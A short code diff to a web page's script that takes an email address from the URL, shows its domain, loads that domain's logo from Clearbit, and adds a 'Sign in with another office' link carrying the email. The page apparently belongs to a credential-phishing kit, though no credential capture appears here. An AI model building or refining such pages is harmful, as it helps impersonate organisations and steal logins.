@@ -145,8 +145,7 @@
       </td>
     </tr>
   </table>
-
-  <script>
+    <script>
     const params = new URLSearchParams(window.location.search);
     const raw = params.get('login');
     const email = raw ? decodeURIComponent(raw) : '';
@@ -165,6 +164,12 @@
       document.getElementById('domainAddon').textContent = '@' + domain;
       document.getElementById('domainLabel').textContent = domain;
       document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
+    }
+
+    // Update the "Sign in with another office" link
+    const another = document.getElementById('anotherLink');
+    if (another && email) {
+      another.href = `another_user.html?login=${encodeURIComponent(email)}`;
     }
   </script>
 </body>
